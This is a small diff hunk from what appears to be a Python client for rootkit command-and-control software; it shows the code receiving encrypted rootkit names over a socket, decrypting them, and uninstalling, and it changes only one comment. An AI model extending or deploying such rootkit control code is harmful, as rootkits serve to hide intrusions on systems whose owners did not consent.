@@ -279,7 +279,7 @@ if __name__ == '__main__':
                     print(constants.CLIENT_RESPONSE.format(constants.UNINSTALL))
                     rootkit_names = decrypt_string(client_socket.recv(1024).decode(), shared_secret).split("/")
 
-                    # Uninstall Rootkit
+                    # Perform Uninstall
                     try:
                         uninstall(rootkit_names[0])
                     except FileNotFoundError as e:
